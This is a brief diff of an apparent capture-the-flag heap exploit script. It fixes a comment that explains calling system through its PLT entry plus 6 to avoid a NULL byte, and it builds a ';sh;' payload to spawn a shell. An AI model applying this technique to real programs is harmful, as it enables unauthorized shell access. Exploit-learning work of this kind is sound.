@@ -33,7 +33,7 @@ free(1)
 free(0)
 
 payload = flat([
-    elf.plt["system"]+6,";sh;" // system plt 有 NULL byte，所以用 elf.plt["system"]+6 重新 dl_runtime_resolve 即可
+    elf.plt["system"]+6,";sh;" # system plt 有 NULL byte，所以用 elf.plt["system"]+6 重新 dl_runtime_resolve 即可
     ])
 add(8,payload)
 list(1)
